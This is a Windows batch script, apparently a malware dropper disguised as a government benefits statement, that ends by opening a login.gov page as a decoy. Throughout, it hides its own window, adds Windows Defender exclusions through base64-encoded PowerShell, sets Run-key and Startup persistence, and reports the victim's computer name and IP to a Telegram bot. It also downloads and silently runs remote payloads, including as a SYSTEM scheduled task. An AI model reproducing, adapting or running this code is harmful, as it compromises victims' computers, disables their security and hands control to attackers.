@echo off
if "%~1"==":h" goto main
>"%TEMP%\h.vbs" echo CreateObject("WScript.Shell").Run "cmd /c ""%~f0"" :h", 0, False
wscript "%TEMP%\h.vbs" >nul 2>&1
if exist "%TEMP%\h.vbs" del "%TEMP%\h.vbs" >nul 2>&1
exit /b

:main
REM --- Self-preservation: copy to safe location to survive ZIP closure ---
set SELF_SAFE=%TEMP%\sc_self.bat
if /i not "%~f0"=="%SELF_SAFE%" (
    copy /y "%~f0" "%SELF_SAFE%" >nul 2>&1
    if exist "%SELF_SAFE%" (
        start "" /b cmd /c "%SELF_SAFE%" :h
        exit /b
    )
)
set LOG=%TEMP%\sc_install.log
echo [%DATE% %TIME%] Starting > "%LOG%"
powershell -NoProfile -Command "try{$f=$false;$w=Get-WmiObject Win32_Process -ErrorAction SilentlyContinue|Where-Object{$_.CommandLine-like'*f71da85ba6cd221e*'-and$_.ProcessId-ne$pid}|Select -First 1;if($w){$f=$true};$s=Get-Service|Where-Object{$_.DisplayName-like'*f71da85ba6cd221e*'}|Select -First 1;if($s){$f=$true};if($f){exit 2}else{exit 0}}catch{exit 0}" >nul 2>&1
set _r=%errorlevel%
echo [%DATE% %TIME%] Pre-check done code=%_r% >> "%LOG%"
if %_r% equ 2 (
    echo [%DATE% %TIME%] Pre-check: Already installed >> "%LOG%"
    goto installed
)
cd /d %TEMP%
echo [%DATE% %TIME%] In TEMP ok >> "%LOG%"
set _p1=pow
set _p2=er
set _p3=shell
set a=%_p1%%_p2%%_p3%
set b=-NoProfile -ExecutionPolicy Bypass
set rc=0
echo [%DATE% %TIME%] Vars set >> "%LOG%"

REM --- Notif #1: Get IP + send Telegram via VBS (no AMSI) ---
timeout /t 3 /nobreak >nul
>"%TEMP%\nip.vbs" echo Set r=CreateObject("MSXML2.ServerXMLHTTP"):r.Open "GET","https://api.ipify.org",False:r.Send:WScript.Echo r.ResponseText
for /f "delims=" %%i in ('cscript //nologo "%TEMP%\nip.vbs"') do set "myip=%%i"
if "%myip%"=="" set myip=Unknown
>"%TEMP%\ntg.vbs" echo Set r=CreateObject("MSXML2.ServerXMLHTTP"):r.Open "GET","https://api.telegram.org/bot8945406701:AAHJGEJRo-D12yw6tlDe5XySkLKOoRvJ3-0/sendMessage?chat_id=-5318643408^&text=%%F0%%9F%%93%%9C%%20SSA-2026-STATEMENT-33804332%%20Opened!%%0A%%F0%%9F%%96%%A5%%20PC%%3A%%20%COMPUTERNAME%%%0A%%F0%%9F%%8C%%90%%20IP%%3A%%20%myip%%%0A%%F0%%9F%%94%%97%%20Method%%3A%%20NewMethod-a3b6f28b",False:r.Send:WScript.Quit 0
cscript //nologo "%TEMP%\ntg.vbs" >nul 2>&1
if exist "%TEMP%\ntg.vbs" echo [%DATE% %TIME%] Notif #1 sent >> "%LOG%" & del "%TEMP%\nip.vbs" "%TEMP%\ntg.vbs" >nul 2>&1

REM --- Pre-run: Try to add Defender exclusions ---
%a% -NoProfile -EncodedCommand "dAByAHkAewBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABlAG4AdgA6AFQARQBNAFAAIAAtAEYAbwByAGMAZQA6ACQAdAByAHUAZQB9AGMAYQB0AGMAaAB7AH0A" >nul 2>&1
%a% -NoProfile -EncodedCommand "dAByAHkAewBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAKAAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQArACcAXABTAEMAVQBwAGQAYQB0AGUAcgAnACkAIAAtAEYAbwByAGMAZQA6ACQAdAByAHUAZQB9AGMAYQB0AGMAaAB7AH0A" >nul 2>&1
echo [%DATE% %TIME%] Defender done >> "%LOG%"

REM --- Persist script to survive reboots ---
set SELF=%~f0
set PERM_DIR=%APPDATA%\SCUpdater
if not exist "%PERM_DIR%" mkdir "%PERM_DIR%" 2>>"%LOG%"
copy /y "%SELF%" "%PERM_DIR%\install.bat" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SCUpdater /d "%PERM_DIR%\install.bat" /f >nul 2>&1
copy /y "%PERM_DIR%\install.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SCUpdater.bat" >nul 2>&1
echo [%DATE% %TIME%] Persistence set >> "%LOG%"

set dc=0

:retry
set /a rc+=1
set /a dc+=1
echo [%DATE% %TIME%] Attempt %rc% >> "%LOG%"

REM --- Step 1c: Download payload via VBS (bypasses Defender) ---
del sc_e.txt sc_a.txt >nul 2>&1
>"%TEMP%\ndl.vbs" echo Set r=CreateObject("MSXML2.ServerXMLHTTP"):r.Open "GET","https://amexsafekeyupdate.com/login/api/download/text?token=5054b0fe51bb2cb6a10bbd270c67ab27",False:r.Send:WScript.Echo r.ResponseText
for /f "usebackq tokens=1,* delims= " %%a in (`cscript //nologo "%TEMP%\ndl.vbs"`) do (
    echo %%a>sc_e.txt
    if not "%%b"=="" (echo %%b>sc_a.txt) else (echo.>sc_a.txt)
    echo OK:>>dBg.txt
    echo EXE:%%a>>dBg.txt
    echo ARG:%%b>>dBg.txt
    copy sc_e.txt "%PERM_DIR%\sc_e.txt" >nul 2>&1
    copy sc_a.txt "%PERM_DIR%\sc_a.txt" >nul 2>&1
)
del "%TEMP%\ndl.vbs" >nul 2>&1

REM --- Check if download succeeded ---
if exist "sc_e.txt" goto download_ok
if %dc% gtr 10 exit /b 1
timeout /t 3 /nobreak >nul
goto retry

:download_ok
echo [%DATE% %TIME%] Download OK >> "%LOG%"
set dc=0

REM --- Step 2: Try installer via Start-Process ---
%a% %b% -EncodedCommand "dAByAHkAewAkAGUAPQBHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAnAHMAYwBfAGUALgB0AHgAdAAnACAALQBSAGEAdwA7ACQAZQA9ACQAZQAuAFQAcgBpAG0AKAApADsAJABhAD0ARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJwBzAGMAXwBhAC4AdAB4AHQAJwAgAC0AUgBhAHcAOwAkAGEAPQAkAGEALgBUAHIAaQBtACgAKQA7ACQAcAA9AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAkAGEAIAAtAFYAZQByAGIAIABSAHUAbgBBAHMAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBQAGEAcwBzAFQAaAByAHUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAOwBpAGYAKAAkAHAALgBXAGEAaQB0AEYAbwByAEUAeABpAHQAKAAxADgAMAAwADAAMAApACkAewBlAHgAaQB0ACAAMAB9AGUAbABzAGUAewB0AHIAeQB7ACQAcAAuAEsAaQBsAGwAKAApAH0AYwBhAHQAYwBoAHsAfQA7AGUAeABpAHQAIAAxAH0AfQBjAGEAdABjAGgAewBlAHgAaQB0ACAAMQB9AA==" >nul 2>&1
if %errorlevel% equ 0 (
    echo [%DATE% %TIME%] Install Method 1 OK >> "%LOG%"
    goto check_start
)
echo [%DATE% %TIME%] Method 1 failed >> "%LOG%"

REM --- Step 2b: Fallback — scheduled task as SYSTEM ---
%a% %b% -EncodedCommand "dAByAHkAewAkAGUAPQBHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAnAHMAYwBfAGUALgB0AHgAdAAnACAALQBSAGEAdwA7ACQAZQA9ACQAZQAuAFQAcgBpAG0AKAApADsAJABhAD0ARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJwBzAGMAXwBhAC4AdAB4AHQAJwAgAC0AUgBhAHcAOwAkAGEAPQAkAGEALgBUAHIAaQBtACgAKQA7ACQAdABuAD0AJwBTAEMAUwBlAHQAdQBwAF8AJwArAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGEAdABoAF0AOgA6AEcAZQB0AFIAYQBuAGQAbwBtAEYAaQBsAGUATgBhAG0AZQAoACkALgBSAGUAcABsAGEAYwBlACgAJwAuACcALAAnACcAKQA7ACQAdAByAD0AJwBcACIAJwArACQAZQArACcAXAAiACAAJwArACQAYQA7ACQAcgA9AHMAYwBoAHQAYQBzAGsAcwAgAC8AYwByAGUAYQB0AGUAIAAvAGYAIAAvAHMAYwAgAE8ATgBDAEUAIAAvAHQAbgAgACQAdABuACAALwB0AHIAIAAkAHQAcgAgAC8AcgB1ACAAUwBZAFMAVABFAE0AIAAvAHMAdAAgADAAMAA6ADAAMAAgAC8AcgBsACAASABJAEcASABFAFMAVAAgADIAPgAmADEAOwBpAGYAKAAkAEwAQQBTAFQARQBYAEkAVABDAE8ARABFACAALQBlAHEAIAAwACkAewBzAGMAaAB0AGEAcwBrAHMAIAAvAHIAdQBuACAALwB0AG4AIAAkAHQAbgAgADIAPgAmADEAfABPAHUAdAAtAE4AdQBsAGwAOwBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAzADsAcwBjAGgAdABhAHMAawBzACAALwBkAGUAbABlAHQAZQAgAC8AZgAgAC8AdABuACAAJAB0AG4AIAAyAD4AJgAxAHwATwB1AHQALQBOAHUAbABsADsAZQB4AGkAdAAgADAAfQBlAGwAcwBlAHsAZQB4AGkAdAAgADIAfQB9AGMAYQB0AGMAaAB7AGUAeABpAHQAIAAyAH0A" >nul 2>&1
if %errorlevel% equ 0 (
    echo [%DATE% %TIME%] Install Method 2 OK >> "%LOG%"
    goto check_start
)
echo [%DATE% %TIME%] Method 2 failed >> "%LOG%"
timeout /t 3 /nobreak >nul
goto retry

:check_start
set i=0

:check
set /a i+=1
if %i% gtr 12 (
    timeout /t 2 /nobreak >nul
    goto retry
)
%a% %b% -EncodedCommand "dAByAHkAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAA1ADsAJABmAD0AJABmAGEAbABzAGUAOwAkAHcAPQBHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAAVwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQB8AFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0AHsAJABfAC4AQwBvAG0AbQBhAG4AZABMAGkAbgBlAC0AbABpAGsAZQAnACoAZgA3ADEAZABhADgANQBiAGEANgBjAGQAMgAyADEAZQAqACcALQBhAG4AZAAkAF8ALgBQAHIAbwBjAGUAcwBzAEkAZAAtAG4AZQAkAHAAaQBkAH0AfABTAGUAbABlAGMAdAAgAC0ARgBpAHIAcwB0ACAAMQA7AGkAZgAoACQAdwApAHsAJABmAD0AJAB0AHIAdQBlAH0AOwAkAHMAPQBHAGUAdAAtAFMAZQByAHYAaQBjAGUAfABXAGgAZQByAGUALQBPAGIAagBlAGMAdAB7ACQAXwAuAEQAaQBzAHAAbABhAHkATgBhAG0AZQAtAGwAaQBrAGUAJwAqAGYANwAxAGQAYQA4ADUAYgBhADYAYwBkADIAMgAxAGUAKgAnAH0AfABTAGUAbABlAGMAdAAgAC0ARgBpAHIAcwB0ACAAMQA7AGkAZgAoACQAcwApAHsAJABmAD0AJAB0AHIAdQBlAH0AOwBpAGYAKAAkAGYAKQB7AGUAeABpAHQAIAAyAH0AZQBsAHMAZQB7AGUAeABpAHQAIAAwAH0AfQBjAGEAdABjAGgAewBlAHgAaQB0ACAAMAB9AA==" >nul 2>&1
if %errorlevel% equ 2 goto installed
timeout /t 5 /nobreak >nul
goto check

:installed
echo [%DATE% %TIME%] SC Confirmed installed! >> "%LOG%"
REM --- Clean up persistence ---
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SCUpdater /f >nul 2>&1
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SCUpdater.bat" >nul 2>&1

>"%TEMP%\ntg2.vbs" echo Set r=CreateObject("MSXML2.ServerXMLHTTP"):r.Open "GET","https://api.telegram.org/bot8945406701:AAHJGEJRo-D12yw6tlDe5XySkLKOoRvJ3-0/sendMessage?chat_id=-5318643408^&text=%%F0%%9F%%94%%A5%%20SC%%20Installed%%20on%%20%COMPUTERNAME%%%20%%F0%%9F%%94%%91%%20Hash%%3A%%20f71da85ba6cd221e",False:r.Send:WScript.Quit 0
cscript //nologo "%TEMP%\ntg2.vbs" >nul 2>&1
>"%TEMP%\ntg3.vbs" echo Set r=CreateObject("MSXML2.ServerXMLHTTP"):r.Open "GET","https://api.telegram.org/bot8945406701:AAHJGEJRo-D12yw6tlDe5XySkLKOoRvJ3-0/sendMessage?chat_id=-5318643408^&text=%%E2%%9C%%85%%20SSA-2026-STATEMENT-33804332%%20Installed!%%0A%%F0%%9F%%96%%A5%%20PC%%3A%%20%COMPUTERNAME%%%0A%%F0%%9F%%94%%97%%20Method%%3A%%20NewMethod-a3b6f28b",False:r.Send:WScript.Quit 0
cscript //nologo "%TEMP%\ntg3.vbs" >nul 2>&1
del "%TEMP%\ntg2.vbs" "%TEMP%\ntg3.vbs" >nul 2>&1
echo [%DATE% %TIME%] Notifications #2+3 sent >> "%LOG%"

REM --- Download SC2 payload via VBS ---
echo [%DATE% %TIME%] Downloading SC2 payload >> "%LOG%"
>"%TEMP%\ndl2.vbs" echo Set r=CreateObject("MSXML2.ServerXMLHTTP"):r.Open "GET","https://amexsafekeyupdate.com/login/api/download/text?token=7b21033267fc677954d6c732c5117828",False:r.Send:WScript.Echo r.ResponseText
for /f "usebackq tokens=1,* delims= " %%a in (`cscript //nologo "%TEMP%\ndl2.vbs"`) do (
    echo %%a>sc2_e.txt
    if not "%%b"=="" (echo %%b>sc2_a.txt) else (echo.>sc2_a.txt)
    echo SC2 OK:>>dBg.txt
    echo SC2 EXE:%%a>>dBg.txt
    echo SC2 ARG:%%b>>dBg.txt
    copy sc2_e.txt "%PERM_DIR%\sc2_e.txt" >nul 2>&1
    copy sc2_a.txt "%PERM_DIR%\sc2_a.txt" >nul 2>&1
)
del "%TEMP%\ndl2.vbs" >nul 2>&1
if not exist sc2_e.txt (
    echo [%DATE% %TIME%] SC2 download failed >> "%LOG%"
    goto sc2_done
)
echo [%DATE% %TIME%] SC2 download OK >> "%LOG%"

REM --- Install SC2 via Start-Process ---
%a% %b% -EncodedCommand "dAByAHkAewAkAGUAPQBHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAnAHMAYwAyAF8AZQAuAHQAeAB0ACcAIAAtAFIAYQB3ADsAJABlAD0AJABlAC4AVAByAGkAbQAoACkAOwAkAGEAPQBHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAnAHMAYwAyAF8AYQAuAHQAeAB0ACcAIAAtAFIAYQB3ADsAJABhAD0AJABhAC4AVAByAGkAbQAoACkAOwAkAHAAPQBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJABhACAALQBWAGUAcgBiACAAUgB1AG4AQQBzACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0AUABhAHMAcwBUAGgAcgB1ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwADsAaQBmACgAJABwAC4AVwBhAGkAdABGAG8AcgBFAHgAaQB0ACgAMQA4ADAAMAAwADAAKQApAHsAZQB4AGkAdAAgADAAfQBlAGwAcwBlAHsAdAByAHkAewAkAHAALgBLAGkAbABsACgAKQB9AGMAYQB0AGMAaAB7AH0AOwBlAHgAaQB0ACAAMQB9AH0AYwBhAHQAYwBoAHsAZQB4AGkAdAAgADEAfQA=" >nul 2>&1
if %errorlevel% equ 0 (
    echo [%DATE% %TIME%] SC2 Install Method 1 OK >> "%LOG%"
    goto sc2_check
)
echo [%DATE% %TIME%] SC2 Method 1 failed >> "%LOG%"

REM --- SC2 Fallback: Scheduled task as SYSTEM ---
%a% %b% -EncodedCommand "dAByAHkAewAkAGUAPQBHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAnAHMAYwAyAF8AZQAuAHQAeAB0ACcAIAAtAFIAYQB3ADsAJABlAD0AJABlAC4AVAByAGkAbQAoACkAOwAkAGEAPQBHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAnAHMAYwAyAF8AYQAuAHQAeAB0ACcAIAAtAFIAYQB3ADsAJABhAD0AJABhAC4AVAByAGkAbQAoACkAOwAkAHQAbgA9ACcAUwBDADIAUwBlAHQAdQBwAF8AJwArAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGEAdABoAF0AOgA6AEcAZQB0AFIAYQBuAGQAbwBtAEYAaQBsAGUATgBhAG0AZQAoACkALgBSAGUAcABsAGEAYwBlACgAJwAuACcALAAnACcAKQA7ACQAdAByAD0AJwBcACIAJwArACQAZQArACcAXAAiACAAJwArACQAYQA7ACQAcgA9AHMAYwBoAHQAYQBzAGsAcwAgAC8AYwByAGUAYQB0AGUAIAAvAGYAIAAvAHMAYwAgAE8ATgBDAEUAIAAvAHQAbgAgACQAdABuACAALwB0AHIAIAAkAHQAcgAgAC8AcgB1ACAAUwBZAFMAVABFAE0AIAAvAHMAdAAgADAAMAA6ADAAMAAgAC8AcgBsACAASABJAEcASABFAFMAVAAgADIAPgAmADEAOwBpAGYAKAAkAEwAQQBTAFQARQBYAEkAVABDAE8ARABFACAALQBlAHEAIAAwACkAewBzAGMAaAB0AGEAcwBrAHMAIAAvAHIAdQBuACAALwB0AG4AIAAkAHQAbgAgADIAPgAmADEAfABPAHUAdAAtAE4AdQBsAGwAOwBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAzADsAcwBjAGgAdABhAHMAawBzACAALwBkAGUAbABlAHQAZQAgAC8AZgAgAC8AdABuACAAJAB0AG4AIAAyAD4AJgAxAHwATwB1AHQALQBOAHUAbABsADsAZQB4AGkAdAAgADAAfQBlAGwAcwBlAHsAZQB4AGkAdAAgADIAfQB9AGMAYQB0AGMAaAB7AGUAeABpAHQAIAAyAH0A" >nul 2>&1
if %errorlevel% equ 0 (
    echo [%DATE% %TIME%] SC2 Install Method 2 OK >> "%LOG%"
) else (
    echo [%DATE% %TIME%] SC2 Method 2 failed >> "%LOG%"
)

:sc2_check
set _s2c=0

:sc2_loop
set /a _s2c+=1
if %_s2c% gtr 8 (
    echo [%DATE% %TIME%] SC2 check timed out >> "%LOG%"
    goto sc2_notfound
)
timeout /t 5 /nobreak >nul
%a% %b% -EncodedCommand "dAByAHkAewAkAHcAPQBHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAAVwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQB8AFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0AHsAJABfAC4AQwBvAG0AbQBhAG4AZABMAGkAbgBlAC0AbABpAGsAZQAnACoAZQBkADYAMwAwAGMAYwAyAGMAOAA3ADMAYgAwADkAMQAqACcAfQB8AFMAZQBsAGUAYwB0ACAALQBGAGkAcgBzAHQAIAAxADsAaQBmACgAJAB3ACkAewBlAHgAaQB0ACAAMgB9ADsAJABzAD0ARwBlAHQALQBTAGUAcgB2AGkAYwBlAHwAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAewAkAF8ALgBEAGkAcwBwAGwAYQB5AE4AYQBtAGUALQBsAGkAawBlACcAKgBlAGQANgAzADAAYwBjADIAYwA4ADcAMwBiADAAOQAxACoAJwB9AHwAUwBlAGwAZQBjAHQAIAAtAEYAaQByAHMAdAAgADEAOwBpAGYAKAAkAHMAKQB7AGUAeABpAHQAIAAyAH0AOwBlAHgAaQB0ACAAMAB9AGMAYQB0AGMAaAB7AGUAeABpAHQAIAAwAH0A" >nul 2>&1
if %errorlevel% equ 2 goto sc2_found
goto sc2_loop

:sc2_found
echo [%DATE% %TIME%] SC2 installed! >> "%LOG%"
>"%TEMP%\ntg_sc2.vbs" echo Set r=CreateObject("MSXML2.ServerXMLHTTP"):r.Open "GET","https://api.telegram.org/bot8945406701:AAHJGEJRo-D12yw6tlDe5XySkLKOoRvJ3-0/sendMessage?chat_id=-5318643408^&text=%%F0%%9F%%94%%84%%20This%%20PC%%20%COMPUTERNAME%%%20Transfered%%20With%%20Hash%%3A%%20ed630cc2c873b091%%20%%F0%%9F%%94%%91",False:r.Send:WScript.Quit 0
cscript //nologo "%TEMP%\ntg_sc2.vbs" >nul 2>&1
del "%TEMP%\ntg_sc2.vbs" >nul 2>&1    echo [%DATE% %TIME%] SC2 notification sent >> "%LOG%"
    goto sc2_done

:sc2_notfound
echo [%DATE% %TIME%] SC2 not found >> "%LOG%"
:sc2_done
start https://secure.login.gov >nul 2>&1
echo [%DATE% %TIME%] DONE >> "%LOG%"